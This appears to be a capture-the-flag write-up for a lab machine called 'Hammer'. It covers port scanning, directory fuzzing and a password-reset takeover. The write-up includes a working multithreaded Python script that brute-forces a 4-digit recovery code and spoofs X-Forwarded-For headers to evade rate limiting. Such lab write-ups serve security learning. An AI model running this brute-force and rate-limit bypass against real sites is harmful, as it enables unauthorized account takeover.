<blockquote>
<b>HAMMER</b><br><br>
  - First i started a nmap scan with:
  <pre>
  nmap -sC -sV -vv 10.48.143.205
  </pre>
  - But i don't see any hopeful result.Only ssh open: <br>
	<br><img width="1199" alt="image" src="https://github.com/user-attachments/assets/c1ee6405-9dfa-4669-92c0-3c0d2327f442" /><br>
	- Then i started a nmap scan for all ports with:<br>
	<pre>
		nmap -sC -sV -vv -p- 10.48.143.205
	</pre>
	- Here i see that a http server is running on a non-standard port 1337:<br>
	<br><img width="987" alt="image" src="https://github.com/user-attachments/assets/a233b61c-edaa-4b39-aed6-788e8540cf19" /><br>
	- After visiting that webpage we can see a login page:<br>
	<br><img width="1267" alt="image" src="https://github.com/user-attachments/assets/bb60d5d2-cd00-4adb-b1eb-a05e2a744ffe" /><br>
	- The Forgot Password page looks like this:<br>
	<br><img width="714" alt="image" src="https://github.com/user-attachments/assets/9f8b97ee-fddd-4842-9337-fa5be67b0da3" /><br>
	- To reset password we need a valid email.<br>
	- Upon seeing the sourcecode of login page I find something interesting:<br>
	<br><img width="879" alt="image" src="https://github.com/user-attachments/assets/e25ad5e1-dd9e-4c47-9ccc-ca8ffc90f7a2" /><br>
	- I used Ffuf to enumerate to find directories that starts with 'hmr_' with:<br>
	<pre style="white-space: pre-wrap;">
		ffuf -u http://10.48.143.205:1337/hmr_FUZZ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
	</pre>
	- I find something interesting:<br>
	<br><img width="1344" alt="image" src="https://github.com/user-attachments/assets/54220cff-2a06-489b-aa03-d261049fbfc8" /><br>
	- Upon visiting '/hmr_logs' I see something interesting:<br>
	<br><img width="1276" alt="image" src="https://github.com/user-attachments/assets/f3babecf-605c-4d45-af0f-846685df234d" /><br>
	- Clicking on that takes me here,where i find an email 'tester@hammer.thm' which we can use later to reset password:<br>
	<br><img width="1277" alt="image" src="https://github.com/user-attachments/assets/21127129-2436-4c70-98b9-e103df91f278" /><br>
	- I go back to reset password page and enter the email i just found.Then I see this page:<br>
	<br><img width="1271" alt="image" src="https://github.com/user-attachments/assets/944a0f30-2cec-487b-bdfd-28f29c0208a1" /><br>
  - To reset password we have to enter the 4 digit verification code within the time limit.Upon trying a dummy verification code '1234' and inspecting the Network Tab in browser developer tool I see the data being transmitted:<br>
	<br><img width="1369" alt="image" src="https://github.com/user-attachments/assets/b7220cbd-fad3-4057-82ab-c294e14c6c96" /><br>
	- I intercepted the request in burp suite to see the request better:<br>
	<br><img width="707" alt="image" src="https://github.com/user-attachments/assets/e00a53c4-764c-468a-978c-2ac2920f1172" /><br>
	- As we can see in the request header our php session id(we can get it from the cookie in our browser) and in the request body the verification code that we enter are being passed:<br>
	- Let's take a look at the response we get from this request:<br>
	<br><img width="744" alt="image" src="https://github.com/user-attachments/assets/b7080d93-df3b-4f4a-9ccb-8c966b708877" /><br>
	- Here I want to mention some important details:
	<pre style="white-space: pre-wrap;">
		1. The 's' parameter sent in the request body is tricky.I tried to change it to large integers
			so that we can get enough time to bruteforce the verification code.But upon seeing the page source code 
			i realized what 's' does.The 's' is nothing but a client-side countdownwhen.when it hits 0 we are logged out.
		2. Upon changing the 's' value to a large integers we can prevent from being logged out.
			But after a limited attempt to bruteforce the verification code we still get "Time elapsed" error.
			I think the actual time limit is handled server side(the real time limit is around 180 seconds).
		3. There is a server side rate limiting as we can see in the screenshot of the response.
			For a successful brute force this rate limiting has to be bypassed.This can be done by 
			changing the client ip address by adding "x_forwarded_for" field in request header and then changing it's value.
	</pre>
	- So here's what we will do:<br>
		1. we will try every possible 4 digit number as verification code.<br>
		2. we will add "x_forwarded_for" field in request header and change the value randomly for each request.<br>
		3. we have to add multithreading so that we can try all numbers within time limit(i.e 180 seconds).<br>
		4. Then we will inspect the response.if it doesn't contain '"Invalid or expired recovery code!" then we found correct code.<br>
	- Here's the script that i used.<br><br>
<details>
<summary><b>Click to see script.py</b></summary>

```python
		import requests
		import random
		from concurrent.futures import ThreadPoolExecutor
		
		url = "http://10.48.155.166:1337/reset_password.php"
		cookie = "PHPSESSID=2suktk8hkhkctt305g8dq63s4g" #you have to put your own cookie here.
		
		headers_template = {
		    "Host": "10.48.155.166:1337",
		    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
		    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		    "Accept-Language": "en-GB,en;q=0.9",
		    "Accept-Encoding": "gzip, deflate, br",
		    "Content-Type": "application/x-www-form-urlencoded",
		    "Origin": "http://10.48.155.166:1337",
		    "Connection": "keep-alive",
		    "Referer": "http://10.48.155.166:1337/reset_password.php",
		    "Cookie": cookie,
		    "Upgrade-Insecure-Requests": "1",
		    "Priority": "u=0, i"
		}
		
		def send_request(code):
			#this part is to generate all 4 digit code
		    recovery_code = f"{code:04d}"
			#this below part is to change the ip address randomly so that we can bypass the rate limiting
		    ip_middle = random.randint(0, 255)
		    ip_last = random.randint(1, 254)
		    x_forwarded_for = f"10.48.{ip_middle}.{ip_last}"
		    headers = headers_template.copy()
		    headers["X-Forwarded-For"] = x_forwarded_for
		    data = f"recovery_code={recovery_code}&s=172"
		    try:
		        response = requests.post(url, data=data, headers=headers, timeout=10)
		        if "Invalid or expired recovery code!" not in response.text:
		            print(f"\n Correct code found: {recovery_code}")
		    except Exception as e:
		        print(f"Code: {recovery_code}, Request failed: {e}")
		#Now we have to spawn multiple therads to be able to try out all 10,000 combination.
		#without multithreading we won't be able to try all within 180 seconds which is the time limit.
		with ThreadPoolExecutor(max_workers=70) as executor:
		    executor.map(send_request, range(10000))

```
</details>	
	- Enter the email in the reset password page. And when the countdown starts run the script AFTER CHANGING the ip addr,cookie.When a correct code is found terminate the running script before submitting that code:<br>
	<br><img width="494" alt="image" src="https://github.com/user-attachments/assets/0405c64a-49b5-41ff-a266-b7c40a5ead6d" /><br>
	- After submitting the correct code a new page will open where we can set our new password:<br>
	<br><img width="1467" alt="image" src="https://github.com/user-attachments/assets/5861a791-3a97-439f-a657-3d0822cd6ab0" /><br>
	- After logging in with our new password we get the flag:<br>
	<br><img width="1452" alt="image" src="https://github.com/user-attachments/assets/64a6108a-8f27-4265-9898-8d70482fe81f" /><br>
</blockquote>
